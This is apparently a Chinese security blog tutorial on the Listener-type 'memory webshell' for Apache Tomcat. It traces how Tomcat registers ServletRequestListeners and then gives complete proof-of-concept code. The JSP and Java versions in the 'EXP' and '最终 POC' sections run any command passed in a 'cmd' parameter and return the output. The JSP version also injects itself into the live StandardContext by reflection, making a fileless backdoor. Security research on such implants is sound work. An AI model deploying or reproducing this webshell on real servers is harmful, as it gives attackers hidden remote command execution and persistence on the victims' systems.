---
title: Java 内存马之 Listener 型内存马
date: 2026-10-20
---

# Java 内存马之 Listener 型内存马

## Listener 基础

Java Web 开发中的监听器（Listener）就是 Application、Session、Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。

### 用途

可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动触发一些动作，比如监听在线的用户数量、统计网站访问量、网站访问监控等。

### Listener 三个域对象

- ServletContextListener
- HttpSessionListener
- ServletRequestListener

很明显，`ServletRequestListener`是最适合用来作为内存马的，因为`ServletRequestListener`是用来监听`ServletRequest`对象的，当我们访问任意资源时，都会触发`ServletRequestListener#requestInitialized()`方法。下面实现一个恶意的 Listener。

## Listener 基础代码实现

和之前 Filter 型内存马的原理一样，之前我们说到 Filter 内存马需要定义一个实现 Filter 接口的类，Listener 也是一样的，要求 Listener 的业务对象要实现`EventListener`这个接口。

我们可以先看看`EventListener`这个接口：

![1](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/EventListener.png)

它有非常多的实现类，那么如果我们需要实现内存马的话就需要找一个每个请求都会触发的 Listener，我们去寻找的时候一定是优先寻找 Servlet 开头的类。

这里找到了`ServletRequestListener`，因为根据名字以及其中的`requestInitialized()`方法似乎我们发送的每个请求都会触发这个监听器。

![1](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ServletRequestListener.png)

因为猜测`requestInitialized()`方法会触发 Listener 监听器，所以我们在`requestInitialized()`方法中加上一些代码，来证明它什么时候被执行。

```java
package com.solo.listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebServlet;

@WebServlet("/listenerTest")
public class ListenerTest implements ServletRequestListener {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        ServletRequestListener.super.requestDestroyed(sre);
    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("Listener 被调用");
    }
}

```

同样我们需要修改 web.xml，加上：

```xml
<listener>
    <listener-class>com.solo.listener.ListenerTest</listener-class>
</listener>
```

接着访问对应的路径即可，控制台会看到输出。

接下来分析一下 Listener 的运行流程。

## Listener 流程分析

流程分析的意义是让我们能够正确的写入恶意内存马，具体要解决的其实有两个问题：

- 我们的恶意代码应该在哪编写
- Tomcat 中的 Listener 是如何实现注册的

### 应用开启前

#### 先读取 web.xml

在应用启动时，`ContextConfig`类会去读取配置文件，所以我们去`ContextConfig`这个类里面找一下哪个方法是来读取配置文件的。

主要是去看谁调用了 web.xml，最好是谁把 web.xml 作为参数传进去，因为一般作为参数传进去，才会进行大处理，所以找到`configureContext()`方法。

![1](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/configureContext.png)

这个方法主要是做一些读取数据并保存的工作，我们不难发现其中读取了 Filter 等 Servlet 组件，我们重点关注 Listener 的读取，最后在这里找到了读取 web.xml 的地方：

![1](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getListeners.png)

所以这里我们可以打个断点，然后往里看`addApplicationListener()`这个方法，这是一个接口的方法，我们去找它的实现方法：

![1](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addApplicationListeners.png)

第一个`FailedContext`类中的`addApplicationListener()`方法里没有东西，所以去`StandardContext`中。

接下来开始调试。

一开始我们的第一步，直接获取到 web.xml：

![](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/configureContextWebXML.png)

我们可以看到 webxml 中的 listener 已经有对应的 Listener 文件，继续向下，下一步应该是走到`addApplicationListener()`这里。

#### 读取完配置文件加载 Listener

当我们读取完配置文件，当应用启动时，`StandardContext`会去调用`listenerStart()`方法。这个方法负责实例化监听器，并触发应用的生命周期启动回调。

![](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/listenerStart.png)

刚开始的地方，`listenerStart()`方法中有这也一个语句：

```java
String listeners[] = findApplicationListeners();
```

这里实际就是把之前的 Listener 存到这里来。

### 应用运行过程

我们从最开始重新调试，一般断点会下在`requestInitialized()`，但是在这调试时走进去的代码没有什么实际作用，真正的断点应该下在前面的一个方法：

![](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Important.png)

所以断点应该放在`fireRequestInitEvent()`方法中：

![1](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/TrueDebug.png)

开始调试，我们先跟进到`getApplicationEventListeners()`方法中。

![1](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getApplicationEventListeners.png)

`getApplicationEventListeners()`方法就做了一件事：获取一个 Listener 数组。

```java
public Object[] getApplicationEventListeners() {
    return applicationEventListenersList.toArray();
}
```

看一下`applicationEventListenersList`是什么，可以看到 Listener 实际上是存储在`applicationEventListenersList`属性中的。

![1](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/applicationEventListeners.png)

并且我们可以通过`StandardContext#addApplicationEventListener()`来添加 Listener：

```java
public void addApplicationEventListener(Object listener) {
    applicationEventListenersList.add(listener);
}
```

到这一步的调试就没什么东西了，所以这里的逻辑应该和 Filter 差不多，Listener 这里有一个 Listener 数组，对应的 Filter 里面也有一个 Filter 数组。

在 Listener 数组内的 Listener 会被逐个触发，最后到我们自定义的 Listener 的`requestInitialized()`方法中。

![](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/UseRequestInitialized.png)

### 运行流程小结

在应用开始之前，先读取了 web.xml，从中读取到 Listeners，并进行加载，加载完毕后会进行逐个读取，对每一个 Listener 都会调用到`requestInitialized()`方法中。

## Listener 型内存马 EXP

### EXP 分析

如果我们要实现 EXP，需要实现以下步骤：

- 我们的恶意代码要写在`requestInitialized()`方法中。
- 通过`StandardContext`类的`addApplicationEventListener()`方法把恶意的 Listener 放进去。

Listener 与 Filter 的大致流程是一样的，所以我们也可以把 Listener 先放到整个 Servlet 最前面去。

这就是最基础的两步了，如果排先后顺序的话一定是先获取`StandardContext`类，再通过`addApplicationEventListener()`方法把恶意的 Listener 注册进去，我们可以用流程图看一下运行流程。

![](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ListenerRoute.png)

### EXP 编写

先编写恶意代码：

```java
String cmd;
try {
	cmd = sre.getServletRequest().getParameter("cmd");
	org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();
	Field requestField = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");
	requestField.setAccessible(true);
	Request request = (Request) requestField.get(requestFacade);
	Response response = request.getResponse();

	if (cmd != null){
		InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
		int i = 0;
		byte[] bytes = new byte[1024];
		while ((i=inputStream.read(bytes)) != -1){
			response.getWriter().write(new String(bytes,0,i));
			response.getWriter().write("\r\n");
		}
	}
}catch (Exception e){
	e.printStackTrace();
}
```

接着就是获取`StandardContext`的代码，并且添加 Listener。

在`StandardHostValve#invoke`中，可以看到其通过 request 对象来获取`StandardContext`类：

![1](https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Invoke.png)

同样的，由于 JSP 内置了 request 对象，我们也可以使用同样的方式来获取：

```jsp
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
%>
```

然后写一个恶意的 Listener：

```jsp
<%!
    public class Shell_Listener implements ServletRequestListener {
 
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e) {
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
        }
 
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
%>
```

最后添加监听器：

```jsp
<%
	Shell_Listener shell_Listener = new Shell_Listener();
    context.addApplicationEventListener(shell_Listener);
%>
```

### 最终 POC

#### JSP 版本

```jsp
<%@ page import="org.apache.catalina.core.StandardContext" %>  
<%@ page import="java.util.List" %>  
<%@ page import="java.util.Arrays" %>  
<%@ page import="org.apache.catalina.core.ApplicationContext" %>  
<%@ page import="java.lang.reflect.Field" %>  
<%@ page import="java.util.ArrayList" %>  
<%@ page import="java.io.InputStream" %>  
<%@ page import="org.apache.catalina.connector.Request" %>  
<%@ page import="org.apache.catalina.connector.Response" %>  
<%!  
  
    class ListenerMemShell implements ServletRequestListener {  
  
        @Override  
        public void requestInitialized(ServletRequestEvent sre) {  
            String cmd;  
            try {  
                cmd = sre.getServletRequest().getParameter("cmd");  
                org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();  
                Field requestField = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");  
                requestField.setAccessible(true);  
                Request request = (Request) requestField.get(requestFacade);  
                Response response = request.getResponse();  
  
                if (cmd != null){  
                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();  
                    int i = 0;  
                    byte[] bytes = new byte[1024];  
                    while ((i=inputStream.read(bytes)) != -1){  
                        response.getWriter().write(new String(bytes,0,i));  
                        response.getWriter().write("\r\n");  
                    }  
                }  
            }catch (Exception e){  
                e.printStackTrace();  
            }  
        }  
  
        @Override  
        public void requestDestroyed(ServletRequestEvent sre) {  
        }  
    }  
%>  
  
<%  
    ServletContext servletContext =  request.getServletContext();  
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");  
    applicationContextField.setAccessible(true);  
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);  
  
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");  
    standardContextField.setAccessible(true);  
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);  
  
    Object[] objects = standardContext.getApplicationEventListeners();  
    List<Object> listeners = Arrays.asList(objects);  
    List<Object> arrayList = new ArrayList(listeners);  
    arrayList.add(new ListenerMemShell());  
    standardContext.setApplicationEventListeners(arrayList.toArray());  
  
%>
```

#### java 版本

```java
package Listener;  
  
import javax.servlet.ServletRequestEvent;  
import javax.servlet.ServletRequestListener;  
import javax.servlet.annotation.WebListener;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import java.io.BufferedReader;  
import java.io.InputStream;  
import java.io.InputStreamReader;  
import java.lang.reflect.Field;  
  
@WebListener  
public class ListenerShell implements ServletRequestListener {  
    @Override  
 	public void requestDestroyed(ServletRequestEvent servletRequestEvent) {  
    }  
  
    @Override  
 	public void requestInitialized(ServletRequestEvent servletRequestEvent) {  
        HttpServletRequest req = (HttpServletRequest)servletRequestEvent.getServletRequest();  
 		HttpServletResponse resp = this.getResponseFromRequest(req);  
 		String cmd = req.getParameter("cmd");  
 		try {  
            String result = this.CommandExec(cmd);  
 			resp.getWriter().println(result);  
 			System.out.println("部署完成");  
 		} catch (Exception e) {  
  
        }  
    }  
    
    public String CommandExec(String cmd) throws Exception {  
        Runtime rt = Runtime.getRuntime();  
 		Process proc = rt.exec(cmd);  
 		InputStream stderr =  proc.getInputStream();  
 		InputStreamReader isr = new InputStreamReader(stderr);  
 		BufferedReader br = new BufferedReader(isr);  
 		String line = null;  
 		StringBuffer sb = new StringBuffer();  
 		while ((line = br.readLine()) != null) {  
            sb.append(line + "\n");  
 		}  
        return sb.toString();  
 	}  
  
    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) {  
        HttpServletResponse var2 = null;  
  
 		try {  
            Field var3 = var1.getClass().getDeclaredField("response");  
 			var3.setAccessible(true);  
 			var2 = (HttpServletResponse)var3.get(var1);  
 		} catch (Exception var8) {  
            try {  
                Field var4 = var1.getClass().getDeclaredField("request");  
 				var4.setAccessible(true);  
 				Object var5 = var4.get(var1);  
 				Field var6 = var5.getClass().getDeclaredField("response");  
 				var6.setAccessible(true);  
 				var2 = (HttpServletResponse)var6.get(var5);  
 			} catch (Exception var7) {  
            }  
        }  
  
        return var2;  
 	}  
}
```

## 总结

对比 Filter 型内存马，Listener 型内存马的实现要更加简单，Listener 型内存马需要实现的步骤也可以看成是 Filter 型内存马的一部分。



























